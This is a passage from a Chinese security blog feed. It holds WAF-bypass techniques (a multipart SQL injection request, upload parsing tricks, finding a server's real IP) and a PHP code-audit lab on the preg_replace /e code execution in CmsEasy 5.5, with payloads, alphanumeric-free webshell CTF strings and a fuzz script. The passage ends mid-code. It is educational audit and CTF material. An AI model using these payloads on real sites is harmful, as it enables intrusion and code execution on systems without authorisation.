在某些业务中，一些字符会被替换成空(如很多利用json来传递数据的网站很多会把凡斜杠\替换成空，这种则可以利用burpsuit进行fuzzing查找被处理掉的字符)，利用这个就可以用来绕过waf:’an\d‘’&#x3D;‘会变成’and‘’&#x3D;’，导致waf绕过. </li><li>特殊字符绕过，类似前面的内容</li><li>Mutilpart变量覆盖绕过  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=--------1099641188</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>101</span><br><span class="line"></span><br><span class="line"><span class="language-applescript"><span class="comment">----------1099641188</span></span></span><br><span class="line"><span class="language-applescript">Content-Disposition: form-data; <span class="built_in">name</span>=“<span class="built_in">id</span>;filename=xx”;<span class="built_in">name</span>=“<span class="built_in">id</span>”</span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript">&#x27;<span class="keyword">and</span>&#x27;&#x27;=‘</span></span><br><span class="line"><span class="language-applescript"><span class="comment">----------1099641188--</span></span></span><br></pre></td></tr></table></figure>  有些waf检测filename这个属性存在的时候下面的内容则不进行sql注入检测，因此可以构造同名参数前面一个name包含filename这个属性，后面再加一个正常的name属性，但是apache解析的时候会解析后面那个name属性，从而导致waf绕过。</li><li>WAF 解析与 Web 服务解析不一致部分 ASP+IIS 会转换 %u0065 格式的字符Apache 会解析畸形 Method：.php –&gt; &#x2F;1.php.dvw.123 从后往前解析，碰到php才会解析</li><li>Iis5.0-6.0解析漏洞，xx.asp&#x2F;xx.jpg ，xx.asp目录下的文件都解析成asp文件，xx.asp;.jpg 默认被解析为asp文件</li><li>Iis7.5解析漏洞(php.ini开启fix_pathinfo)，xx.jpg 我们在上传文件时，一句话木马写成xx.jpg，访问时后面加上xx.jpg&#x2F;xx.php，图片文件会以php格式执行</li><li>nginx解析漏洞(php.ini开启fix_pathinfo)，xx.jpg%00.php Nginx &lt;8.03 空字节代码执行漏洞，同一个参数多次出现， 取的位置不一样</li></ul></li><li>基于资源的绕过<br>使用消耗大的载荷，耗尽WAF的计算资源，通过增加传递得参数数量，达到waf检测上限，超出的参数就可绕过waf了。比如waf检测文本内容为40字节，多出40的就不再检测，那我们可以把脚本文件写在40个字节文件之后。再比如我们通过缓冲区溢出绕过WAF：当我们上传到服务器的数据量大于waf可以检测的数据量时，可以通过发送大量的垃圾数据将 WAF 溢出，从而绕过waf。union select&#x3D; and (select 1)&#x3D;(select 0xA*111111111111) unIon selectand 1&#x3D;1 &#x3D; and 1&#x3D;1 and 111111…11111111</li><li>基于架构的绕过<br> 寻找真实ip绕过云waf，云waf通过配置NS或者CNAME记录，使得对网站的请求报文优先经过WAF主机，经过WAF主机过滤之后，将被认为无害的请求报文再送给实际的网站服务器进行请求,此时只要找到服务器的真实ip,修改host为服务器真是ip即可绕过云waf<br> 常见寻找真实ip的方式有如下几种<ul><li>证书信息查询 <a href="https://myssl.com/">https://myssl.com/</a></li><li>dns历史解析记录</li><li>搜集子域名ip c段(考虑到费用问题，一些子域名并不会部署)</li><li>超级ping</li></ul></li><li>寻找没有部署waf的nginx反代机器：当waf在nginx服务器上部署，且存在nginx集群时，可以试试尝试寻找能反代服务却又没用部署waf的机器访问进行绕过，以下面这个为例，测试某接口发现被拦截。<br> 以下面这个为例，测试某接口发现被拦截<br> <img src="/2024/10/15/WebSecurity/framwork/waf/image-5.png"><br> 搜集ip信息为xxx.xxx.200.1xx<br> <img src="/2024/10/15/WebSecurity/framwork/waf/image-6.png"><br> 查找c段服务，一个个访问尝试<br> <img src="/2024/10/15/WebSecurity/framwork/waf/image-7.png"></li><li>分块传输绕过WAF：<a href="https://www.anquanke.com/post/id/169738">利用分块传输吊打所有WAF</a>、<a href="https://www.freebuf.com/news/193659.html">技术讨论 | 在HTTP协议层面绕过WAF</a>、<a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247483787&idx=1&sn=54c33727696f8ee6d67f997acc11ab89&chksm=cf36f9cbf84170dd7da9b48b3365fb05d7ccec6bdeff480d0c38962f712e400a40b2b38dc467&token=360242838&lang=zh_CN#rd">编写Burp分块传输插件绕WAF</a>、<a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></li><li>其他特性<ul><li>Mysql特性使用&#x2F;!%0a&#x2F;绕过</li><li>通过编码饶过</li><li>使用截断字符</li><li>重复变量</li><li>参数解析差异</li><li>针对域名的保护</li><li>对Content-Type不同理解</li><li>超大数据包</li><li>Post不同解析方式</li><li>异常数据包</li></ul></li><li>还有一些其他的绕过思路：<ul><li>超长文件名：利用超长的文件名，可以逃过文件后缀名的检测</li><li>上传内容使用垃圾字符：上传一个比较大的文件，将马子藏在其中</li><li>使用参数污染成功执行命令：简而言之，就是给参数赋上多个值</li><li>构造畸形请求包：<br>  有些可以通过修改POST为GET绕过waf<br>  还有的waf通过Content-Type: multipart&#x2F;form-data来判定这是个上传包，然后检测内容<br>  这个方法，又能细分出很多来，而且屡试不爽，这里总结下我个人常用的<br>  (1) 删掉content-type<br>  (2) 构造多个filename<br>  (3)content-type后面加TABLE键<br>  (4)换行boundary<br>  (5)文件名前面加空格<br>  (6)文件名前面加单引号</li><li>文件内容编码绕过：既可以让waf检测不到，又能成功执行命令。</li></ul></li></ol><h2 id="防守（蓝队）视角下的WAF"><a href="#防守（蓝队）视角下的WAF" class="headerlink" title="防守（蓝队）视角下的WAF"></a>防守（蓝队）视角下的WAF</h2><p><a href="https://www.freebuf.com/articles/web/338908.html">https://www.freebuf.com/articles/web/338908.html</a><br><a href="https://help.aliyun.com/zh/waf/web-application-firewall-2-0/use-cases/best-practices-for-access-configuration">WAF接入配置最佳实践</a><br><a href="https://github.com/kumustone/go-fast-waf">go-fast-waf</a></p><ul><li><strong>WAF的配置与优化</strong><ul><li>WAF规则配置</li><li>WAF性能优化</li><li>WAF与其他安全设备的联动</li></ul></li><li><strong>WAF的局限性</strong><ul><li>WAF无法防御所有攻击</li><li>WAF可能引入新的安全风险</li><li>WAF可能影响网站性能</li></ul></li><li><strong>蓝队常用的防御WAF绕过的手段</strong><ul><li>WAF规则不断更新</li><li>WAF与IDS&#x2F;IPS联动</li><li>WAF与Web应用防火墙联动</li><li>应用层防护</li><li>WAF旁路部署</li><li>人工安全监测</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】PHP代码审计3</title>
      <link href="/2024/10/14/WebSecurity/codeaudit/phpaudit3/"/>
      <url>/2024/10/14/WebSecurity/codeaudit/phpaudit3/</url>
      
        <content type="html"><![CDATA[<p>系列内容均来自：<a href="https://github.com/hongriSec/PHP-Audit-Labs/%EF%BC%8C%E4%BB%85%E4%BB%85%E5%9C%A8%E7%AC%94%E8%AE%B0%E4%B8%AD%E4%BF%9D%E5%AD%98">https://github.com/hongriSec/PHP-Audit-Labs/，仅仅在笔记中保存</a></p><h2 id="Day8-Candle"><a href="#Day8-Candle" class="headerlink" title="Day8 - Candle"></a>Day8 - Candle</h2><p>题目叫蜡烛，代码如下</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image.png"></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p></blockquote><ul><li><strong>$pattern</strong> 存在 <strong>&#x2F;e</strong> 模式修正符，允许代码执行</li><li><strong>&#x2F;e</strong> 模式修正符，是 **preg_replace() ** 将 <strong>$replacement</strong> 当做php代码来执行</li></ul><p><strong>漏洞解析</strong> </p><p>这道题目考察的是 <strong>preg_replace</strong> 函数使用 <strong>&#x2F;e</strong> 模式，导致代码执行的问题。我们发现在上图代码 <strong>第11行</strong> 处，将 <strong>GET</strong> 请求方式传来的参数用在了 <strong>complexStrtolower</strong> 函数中，而变量 <strong>$regex</strong> 和 <strong>$value</strong> 又用在了存在代码执行模式的 <strong>preg_replace</strong> 函数中。所以，我们可以通过控制 <strong>preg_replace</strong> 函数第1个、第3个参数，来执行代码。但是可被当做代码执行的第2个参数，却固定为 <strong>‘strtolower(“\\1”)’</strong> 。实际上，这里涉及到正则表达式反向引用的知识，即此处的 <strong>\\1</strong> ，大家可以参考 <a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> 上的解释：</p><blockquote><p><strong>反向引用</strong> </p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p>本题官方给的 <strong>payload</strong> ：**&#x2F;?.<em>&#x3D;{${phpinfo()}}</em>* 实际上并不能用，因为如果GET请求的参数名存在非法字符，PHP会将其替换成下划线，即 <code>.*</code> 会变成 <code>_*</code> 。这里我们提供一个可用 <strong>payload</strong> ：<em><em>\S</em>&#x3D;${phpinfo()}</em>* ，详细分析请参考我们前几天发表的文章： <a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a><br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-1.png"></p><p>在新版本中特别注意<code>/e</code>修饰符已经被废弃，建议使用<code>preg_replace_callback()</code>来安全地实现相同的功能。</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>CmsEasy 5.5</strong> 版本，漏洞入口文件为 <strong>&#x2F;lib&#x2F;tool&#x2F;form.php</strong> ，我们可以看到下图第7行处引用了<strong>preg_replace</strong> ，且使用了 <strong>&#x2F;e</strong> 模式。如果 <code>$form[$name][&#39;default&#39;]</code> 的内容被正则匹配到，就会执行 <strong>eval</strong> 函数，导致代码执行。具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="function"><span class="keyword">function</span> <span class="title">getform</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$form</span>, <span class="variable">$field</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="number">2</span>      <span class="keyword">if</span> (<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>) &amp;&amp; <span class="keyword">isset</span>(setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>)][<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">3</span>          <span class="variable">$form</span>[<span class="variable">$name</span>] = setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>)][<span class="variable">$name</span>];</span><br><span class="line"><span class="number">4</span>      <span class="keyword">if</span> (<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>) &amp;&amp; <span class="keyword">isset</span>(setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>)][<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">5</span>          <span class="variable">$form</span>[<span class="variable">$name</span>] = setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>)][<span class="variable">$name</span>];</span><br><span class="line"><span class="number">6</span>      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]))</span><br><span class="line"><span class="number">7</span>          <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#123;\?([^\&#125;]+)\&#125;/e&#x27;</span>, <span class="string">&quot;eval(&#x27;return <span class="subst">$1</span>;&#x27;)&quot;</span>, <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]);</span><br><span class="line"><span class="number">8</span>      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$name</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]))</span><br><span class="line"><span class="number">9</span>          <span class="variable">$data</span>[<span class="variable">$name</span>] = <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line"><span class="number">10</span>     <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/templat/&#x27;</span>, <span class="variable">$name</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">11</span>         <span class="variable">$data</span>[<span class="variable">$name</span>] = <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>];</span><br></pre></td></tr></table></figure><p>我们再来看看这个 <strong>getform()</strong> 函数在何处被引用。通过搜索，我们可以发现在 <strong>Cache&#x2F;template&#x2F;default&#x2F;manage&#x2F;guestadd.php</strong> 程序中，调用了此函数。这里我们需要关注 <strong>catid</strong> (下图 <strong>第4行</strong> 代码)，因为 <strong>catid</strong> 作为 <strong>$name</strong> 在 <strong>preg_preolace()</strong> 函数中使用到，这是我们成功利用漏洞的关键。 <strong>guestadd.php</strong> 中的关键代码如下：</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-2.png"></p><p>那么问题来了， <strong>catid</strong> 是在何处定义的，或者说与什么有关？通过搜索，我们发现 <strong>lib&#x2F;table&#x2F;archive.php</strong> 文件中的 <strong>get_form()</strong> 函数对其进行了定义。如下图所示，我们可以看到该函数 <strong>return</strong> 了一个数组，数组里包含了<strong>catid</strong> 、 <strong>typeid</strong> 等参数对应的内容。仔细查看，发现其中又嵌套着一个数组。在 <strong>第6行处</strong> 发现了 <strong>default</strong> 字段，这个就是我们上面提到的 <code>$form[$name][&#39;default&#39;]</code> 。</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-3.png"></p><p>而上图 <strong>第6行</strong> 的 <strong>get()</strong> 方法在 <strong>lib&#x2F;tool&#x2F;front_class.php</strong> 中，它是程序内部封装的一个方法。可以看到根据用户的请求方式， <strong>get()</strong> 方法会调用 <strong>front</strong> 类相应的 <strong>get</strong> 方法或 <strong>post</strong> 方法，具体代码如下：</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-4.png"></p><p> <strong>front</strong> 类的 <strong>get</strong> 方法和 <strong>post</strong> 方法如下，看到其分别对应静态数组</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-5.png"></p><p>继续跟进静态方法 <strong>get</strong> 和 <strong>post</strong> ，可以看到在 <strong>front</strong> 类中定义的静态属性</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-6.png"></p><p>这就意味着前面说的 <code>$form[$name][&#39;default&#39;]</code> 中 <strong>name</strong> 和 <strong>default</strong> 的内容，都是我们可以控制的。</p><p>我们屡一下思路，<strong>get_form</strong> 函数定义了 <strong>catid</strong> 的值， <strong>catid</strong> 对应的 <strong>default</strong> 字段又存在代码执行漏洞。而 <strong>catid</strong> 的值由 <strong>get(‘catid’)</strong> 决定，这个 <strong>get(‘catid’)</strong> 又是用户可以控制的。所以我们现在只要找到调用 <strong>get_form</strong> 函数的地方，即可触发该漏洞。通过搜索，我们发现在 <strong>&#x2F;lib&#x2F;default&#x2F;manage_act.php</strong> 文件的第10行调用了 <strong>get_form()</strong> 函数，通过 <strong>View</strong> 模板直接渲染到前台显示：</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-7.png"><br>这就形成了这套程序整体的一个执行流程，如下图所示：</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-8.png"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、首先打开首页，点击游客投稿</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-9.png"></p><p>2、进入到相应的页面，传给catid值，让他匹配到 <code>/\&#123;\?([^&#125;]+)\&#125;/e</code> 这一内容，正则匹配的内容也就是 <code>&#123;?(任意内容)&#125;</code> ，所以我们可以构造payload： <strong>catid&#x3D;{?(phpinfo())}</strong> </p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>漏洞是 <strong>preg_replace()</strong> 存在 <strong>&#x2F;e</strong> 模式修正符，如果正则匹配成功，会造成代码执行漏洞，因此为了避免这样的问题，我们避免使用 <strong>&#x2F;e</strong> 模式修正符，如下图第7行：<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-10.png"></p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="comment">// $hint = &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Day8</strong> 的题目来自8月份 <strong>金融业网络安全攻防比赛</strong> ，写题解的时候发现 <strong>信安之路</strong> 已经写了很好的题解，具体可以点 <a href="https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w">这里</a> ，所以接下来我只会提及关键部分。</p><p>这道题目实际上是考察不包含字母数字的webshell利用，大家可以参考 <strong>phithon</strong> 师傅的文章：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a> ，我们只需要构造并调用 <strong>getFlag</strong> 函数即可获得flag。排除这里正则的限制，正常的想法payload应该类似这样（把上图代码中的正则匹配注释掉进行测试）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?code=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">index.php?code=<span class="variable">$_GET</span>[_]();&amp;_=getFlag</span><br></pre></td></tr></table></figure><p>我们现在再来考虑考虑如何绕过这里的正则。游戏规则很简单，要求我们传入的 <strong>code</strong> 参数不能存在字母及数字，这就很容易想到 <strong>phithon</strong> 师傅的 <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a> 一文。通过异或 <strong>^</strong> 运算、取反 <strong>~</strong> 运算，构造出我们想要的字符就行。这里我们直接看 <strong>payload</strong> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br></pre></td></tr></table></figure><p>我们来拆解分析一下 <strong>payload</strong> ，<strong>eval</strong> 函数会执行如下字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br><span class="line">拆解如下：        第<span class="number">1</span>个GET请求参数：code                &amp;     第<span class="number">2</span>个GET请求参数：_</span><br><span class="line">   <span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;         $&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);     &amp;     _=getFlag</span><br><span class="line">   <span class="variable">$_</span>=<span class="string">&quot;_GET&quot;</span>;                <span class="variable">$_GET</span>[_](<span class="variable">$_GET</span>[__]);     &amp;     _=getFlag</span><br><span class="line">                             <span class="title function_ invoke__">getFlag</span>(<span class="variable">$_GET</span>[__]);</span><br><span class="line">                             <span class="title function_ invoke__">getFlag</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>这个 <strong>payload</strong> 的长度是 <strong>37</strong> ，符合题目要求的 <strong>小于等于40</strong> 。另外，我 <strong>fuzz</strong> 出了长度为 <strong>28</strong> 的 <strong>payload</strong> ，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;%1c%1e%0f%3d%17%1a%1c&quot;</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure><p>这里也给出 <strong>fuzz</strong> 脚本，方便大家进行 <strong>fuzz</strong> 测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;getFlag&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="string">&#x27;&#123;&#x27;</span>^ <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ch</span>, <span class="variable">$a</span> , <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#123; ^ chr(&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;) = <span class="subst">$ch</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="title function_ invoke__">chr</span>(<span class="number">28</span>).<span class="title function_ invoke__">chr</span>(<span class="number">30</span>).<span class="title function_ invoke__">chr</span>(<span class="number">15</span>).<span class="title function_ invoke__">chr</span>(<span class="number">61</span>).<span class="title function_ invoke__">chr</span>(<span class="number">23</span>).<span class="title function_ invoke__">chr</span>(<span class="number">26</span>).<span class="title function_ invoke__">chr</span>(<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-11.png"></p><p>后来在安全客看到一种新的思路，也很不错，具体参考：<a href="https://www.anquanke.com/post/id/154284">CTF题目思考–极限利用</a> 。这篇文章主要是 <strong>利用通配符调用Linux系统命令</strong> 来查看 <strong>flag</strong> ，关于通配符调用命令的文章，大家可以参考： <a href="https://www.anquanke.com/post/id/145518">web应用防火墙逃逸技术（一）</a> 。</p><p>我们来分析安全客这篇文章中的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=`/???/??? /????`;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$_</span><span class="meta">?&gt;</span></span><br><span class="line">实际上等价于：</span><br><span class="line"><span class="variable">$_</span>=`/bin/cat /FLAG`;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$_</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我想说一下 <strong><?=$_?></strong> 这个代码的意思。实际上这串代码等价于 <strong><? echo $_?></strong> 。实际上，当 <strong>php.ini</strong> 中的 <strong>short_open_tag</strong> 开启的时候， <strong><? ?></strong> 短标签就相当于 <strong><?php ?></strong> ， <strong><?=$_?></strong> 也等价于 <strong><? echo $_?></strong> ，这也就解决了输出结果的问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not Allowed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span 